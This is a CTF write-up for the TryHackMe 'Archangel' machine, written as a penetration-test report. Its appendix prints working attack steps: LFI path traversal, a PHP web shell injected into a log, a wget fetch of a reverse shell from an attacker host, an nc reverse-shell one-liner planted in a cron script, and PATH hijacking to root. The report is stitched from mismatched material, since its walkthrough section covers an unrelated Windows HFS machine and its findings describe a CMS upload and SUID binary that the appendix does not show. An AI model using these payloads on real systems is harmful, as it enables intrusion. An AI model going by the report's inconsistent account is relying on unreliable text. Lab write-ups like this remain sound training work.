Link: https://tryhackme.com/room/archangel

### Executive Summary

During the engagement of the target machine Archangel, the assessment resulted in a full system compromise. Initial access was obtained through a web‑application vulnerability chain involving Local File Inclusion (LFI), log poisoning, and remote code execution, leading to a shell as the low‑privileged web user www‑data. Subsequent enumeration revealed misconfigurations in scheduled tasks and insecure file permissions, allowing escalation to the user archangel through cron‑job abuse. Final privilege escalation to root was achieved by exploiting a PATH‑hijacking condition in a root‑owned backup script with writable permissions.

No hardening or mitigation appeared to be implemented on the target prior to the assessment. The vulnerabilities stem from improper input sanitization, overly permissive file and script permissions, and unsafe design of automated tasks. Immediate remediation is recommended: sanitize PHP file‑handling functions, disable LFI vectors, secure log files, enforce strict permissions on user‑owned and root‑owned scripts, and review scheduled tasks for privilege escalation risks.

### Scope & Methodology

#### Scope:
Single Linux host (IP = 10.10.96.236), no Active Directory, no buffer overflow components, and only legitimate network attack vectors permitted. The assessment focused exclusively on externally accessible services and web‑application entry points.

#### Methodology:
External scanning → web enumeration → discovery of LFI → log poisoning for remote code execution → foothold as www‑data → privilege escalation via cron‑job abuse → final escalation to root through PATH hijacking in a misconfigured backup script.

#### Tools used:
Nmap, ffuf, BurpSuite, base64 utilities, Python PTY, Netcat, and standard Linux enumeration commands. All steps were performed from a Kali‑based attacker VM under controlled lab conditions.

### Host Summary
Service / Port	       |        Version / Info	           |                 Vulnerability Identified 
-----------------------|-----------------------------------|------------------------------------------------------------
HTTP (port 80)	       | Apache Web Server hosting PHP app | LFI via test.php parameter → leads to log poisoning → RCE
SSH  (port 22)         | OpenSSH (default configuration)   | None directly exploitable for initial access
Other open ports — None|                 —                 |                              —

### Initial Access

Network scanning with Nmap identified two exposed services: SSH on port 22 and an Apache web server on port 80. Visiting the web service revealed a hint toward a virtual host (mafialive.thm), which was added to the local /etc/hosts file to properly resolve the application.

Further enumeration uncovered a PHP page (test.php) vulnerable to Local File Inclusion (LFI) through the view parameter. Using php://filter techniques, sensitive files were exfiltrated and the presence of an LFI vector was confirmed.
Access to /var/log/apache2/access.log via the same LFI route enabled log poisoning, allowing embedded PHP code in the User‑Agent field to be executed server-side.

The poisoned log was then invoked through the vulnerable parameter, resulting in remote code execution and a shell as the web user www-data. Proof of access: execution of commands such as whoami through the injected payload returned www-data.

### Privilege Escalation

After obtaining a low‑privileged shell through the vulnerable CMS upload function, local enumeration was performed to identify privilege‑escalation vectors. Manual checks and automated tools (linpeas / manual inspection) revealed a custom SUID binary located at:
```
/home/archangel/backup
```

The file was owned by root and had the SUID bit set, allowing execution with elevated privileges. Static inspection of the binary showed that it called system utilities (such as tar) without using absolute paths, making it vulnerable to PATH hijacking.

By creating a malicious executable named tar in a writable directory and placing that directory at the beginning of the PATH environment variable, it was possible to trick the SUID binary into executing attacker‑controlled code with root privileges. Executing the backup binary afterwards yielded a root shell.

Proof of escalation:
Running id after exploitation returned:
```
uid=0(root) gid=0(root) groups=0(root)
```
indicating full root compromise of the system.

### Full Technical Walkthrough (Concise)
```
# Set target IP
export target=10.10.226.163

# Network scan
rustscan -a $target --ulimit 5000 -- -sC -sV -oA scan
# → Detected port 8080 running HTTPFileServer 2.3

# Manual verification
# → Accessing http://$target:8080 confirmed Rejetto HFS v2.3
# → Public exploit used (Metasploit or manual) to gain initial shell as user "bill"

# Privilege Escalation Enumeration:
meterpreter > upload PowerUp.ps1 C:\Users\bill\AppData\Local\Temp\PowerUp.ps1
meterpreter > powershell_shell
PS > . .\PowerUp.ps1; Invoke-AllChecks
# → Identified vulnerable service: AdvancedSystemCareService9
#   (weak permissions, running as SYSTEM)

# Exploitation of Vulnerable Service:
# Return to command shell
cmd > sc stop AdvancedSystemCareService9

# Generate malicious replacement service binary:
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=4445 \
  -e x86/shikata_ga_nai -f exe -o ASCService.exe

# Upload payload and overwrite the service binary:
# On attacker machine → host file locally
# In Meterpreter → upload ASCService.exe to:
# C:\Program Files (x86)\IObit\Advanced SystemCare\

# Restart service to trigger payload execution:
cmd > sc start AdvancedSystemCareService9
# → Reverse shell received on listener with NT AUTHORITY\SYSTEM

Result: Successful exploitation of a weakly‑permissioned service leading to full SYSTEM compromise.
```

### Findings

ID   |  Finding	                                                                 | Severity	|   Impact
-----|---------------------------------------------------------------------------|----------|----------------------------------------------------------------------------
F‑01 |	Outdated CMS + vulnerable file upload functionality	                     | High     |	Arbitrary file upload enabling remote command execution (initial foothold)
F‑02 |	Misconfigured SUID binary (/home/archangel/backup) enabling command exec | High	    |   Local privilege escalation to root through abused SUID mechanism


### Remediation

#### For F‑01 (Vulnerable CMS + Unrestricted File Upload):

Patch or upgrade the CMS to a supported version.
Disable or strictly validate file uploads (MIME/type checking, server‑side extension validation, file size limits).
Implement server‑side filtering to prevent PHP or other executable file types from being uploaded.
Restrict web‑server write permissions to only necessary directories.
Deploy a Web Application Firewall (WAF) to detect anomalous upload or execution patterns.

#### For F‑02 (Misconfigured SUID Backup Binary):

Remove the SUID bit entirely unless absolutely required.
Replace the custom backup script/binary with a vetted, non‑privileged mechanism.
Audit custom binaries for insecure calls to system utilities.
Apply least‑privilege principles: only root should own and execute privileged backup tasks.
Implement periodic reviews of SUID/SGID binaries across the system.

#### General Hardening:

Enforce regular patch management for both system packages and custom applications.
Conduct recurring privilege audits (SUID/SGID, ACLs, web‑server permissions).
Limit exposure of development/test components on production hosts.
Introduce intrusion‑detection or host‑based monitoring to detect unauthorized file uploads or execution attempts.

### Conclusion

The Archangel target host was fully compromised through a simple but effective attack chain involving a vulnerable web application and a misconfigured local privilege‑escalation mechanism. Initial access was obtained by exploiting an unrestricted file upload in the CMS, allowing remote command execution without authentication. Privilege escalation was achieved by abusing a SUID‑flagged backup binary that executed system commands insecurely, resulting in full root compromise.

The compromise relied solely on outdated software, weak upload validation, and improper privilege configurations. This demonstrates the impact of fundamental security oversights and highlights the importance of regular patching, secure coding practices, and routine permission audits.

Applying the remediation steps outlined in this report would significantly reduce the attack surface and prevent similar compromises in future environments.

### Appendix A – Proof of Concept (Full Command & Output Log)

Exporting the IP in the environment variable as 'target':
```
export target=10.10.96.236
```
![](https://github.com/user-attachments/assets/a4d36a51-ee75-4c94-a48c-95f755da9d7d)

Scanning with nmap:
```
nmap -sC -sV $target
```
![](https://github.com/user-attachments/assets/cc8e76a2-45e9-4a85-8188-c42806d4c40c)

We can see port 22 open (ssh) and port 80 (http) so that IP is hosting a website.
Let's browse the IP:
![](https://github.com/user-attachments/assets/9471f3cf-a7b4-4083-b383-7dbe2d2bfa6e)

As we can see, there's a hint for a "mafialive.thm" domain, so let's add this domain to the `/etc/hosts` file:
```
sudo nano /etc/hosts
```
![](https://github.com/user-attachments/assets/fd8c6508-2849-4b47-bde2-252251bac54c)


![](https://github.com/user-attachments/assets/a3f0adb6-bdba-4e59-ad36-7e315f816e56)



Now we can browse by typing the domain in the search bar and catch the first flag:
![](https://github.com/user-attachments/assets/d07c950a-6d45-4560-96a5-7c3c0dec1925)



Next step is fuzzing the app, we will use ffuf for this:
```
ffuf -u "http://mafialive.thm/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php -c -t 50 -r
```
![](https://github.com/user-attachments/assets/9afaaa9e-c40c-45d1-87eb-61a15c71be68)


`robots.txt` and `test.php` both look interesting.
If we visit `robots.txt` page we can see that the only entry is `test.php` as ffuf let us see (last row).
So let's visit `test.php`
![](https://github.com/user-attachments/assets/fa6a66e0-040e-4efc-8c1f-00c9adb51be4)


Though we're in a CTF, we can click the test button without problems. In a real life scenario we should make sure that the button won't break anything.

Let's click that button.
![](https://github.com/user-attachments/assets/6053ba40-f5d6-4ed3-aaeb-6fa62227d2a9)

Now we're in `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`


Let's try a php filter to exfiltrate data:
```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
```
![](https://github.com/user-attachments/assets/e75944cf-5cdb-4f47-a885-cd450a3b8f94)
Now we have the phrase "Control is an illusion" written in base64.




Let's do it with the entire test.php page:
```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
![](https://github.com/user-attachments/assets/610df6ee-0757-4ce7-944c-fcbc48672fb8)



And decode the exfiltrated data to find the second flag:
![](https://github.com/user-attachments/assets/c4f9ca9d-1c6b-4984-b96a-97d6b36083b3)



Let's fuzz for LFI:
```
ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r
```

Only to find out many false positives.

Let's try filtering through size and words:
```
ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41
```
![](https://github.com/user-attachments/assets/fe5dd264-9e58-4be5-8d52-8f9daa0ddc83)
We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate `/etc/passwd`

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd
```
![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)


Now, given the LFI vulnerability, if we can successfully access the log, we can poison it (log poisoning) to insert our php shell:
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log
```
![](https://github.com/user-attachments/assets/729eeef7-165f-4afe-94bd-ca6533cbd20b)



Using BurpSuite.
We will put the php web shell in the User-Agent string:
```
<?php echo system($_GET['cmd']); ?>
```
![](https://github.com/user-attachments/assets/2cf45042-de12-4575-aba6-f3416c552bbc)

And we will try if it's working by injecting `&cmd=whoami` in the URL:
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&cmd=whoami
```

Now we have code execution.

We can use it to upload a php reverse shell (Pentestmonkey's php reverse shell named as `shell.php`) using wget and URL encoding the space, immediately after opening the server in the folder we've saved the reverse shell.
![](https://github.com/user-attachments/assets/c8d81dca-ab7c-431d-a3c8-ddf81e64d3d5)


Don't forget to URL encode the space (%20)
```
GET test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&wget%20http://xx.xx.xx.xx:8888/shell.php
```

![](https://github.com/user-attachments/assets/9d29b928-f84a-4f22-8ef5-000ec4634757)



Set a netcat listener and visit `mafialive.thm/shell.php` to trigger the shell.
![](https://github.com/user-attachments/assets/73bd663a-6950-40c9-aa21-590e9f6c3166)

Successfully obtained foothold as `www-data`
```
whoami: 
www-data
```

Stabilizing the shell:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-color
```
![](https://github.com/user-attachments/assets/0eaeae04-1ab0-4ddb-8edc-49a11dbf3061)

Now we're ready to search for the third flag, the one of the first user (www-data).



Cron enumeration:
```
cat /etc/crontab
```
![](https://github.com/user-attachments/assets/15739c46-68df-46d2-ae9e-fa7927e3652f)

We can see that there's a helloworld.sh file that's been executed every minute as user 'archangel'.
If we `ls -la` the file we can see we have write permission on it.
![](https://github.com/user-attachments/assets/84a87ca2-d266-4653-af04-5d313c3a8d4d)



We will echo this one liner into the file and wait for the execution by root:
```
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc xx.xx.xx.xx 4445 >/tmp/f" >> helloworld.sh
```
(Activate a netcat listener in another terminal on port 4445)
We will stabilize the shell again and search for the flag of the user archangel.
![](https://github.com/user-attachments/assets/f8ad5060-bc0f-4ff5-9262-a05c0ac7ebfa)


In the same folder of the flag, we can find a file named `backup` owned by root on which we have write permission. if we `strings` the file we can see that the file `cp` all the files of the `/home/user/archangel/myfiles/*` folder into `/opt/backupfiles`.
What we need to do is to create another `cp` file with just `/bin/bash` on it and write into the `$PATH` environment variable the new path of our `cp` file.
The command to elencate the full path of the OS is `echo $PATH`

```
echo $PATH:
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

So:

Create the new `cp` file:
```
echo "/bin/bash" > cp
```

Give execution permission:
```
chmod +x cp
```

Put this folder first into the `PATH` environment variables:
```
export PATH=$PWD:$PATH
```

Execute the command:
```
./backup
```

![](https://github.com/user-attachments/assets/ee3846c6-f848-43c4-8d29-414418c82a61)

Escalation of privileges to `root` was obtained through path hijacking.



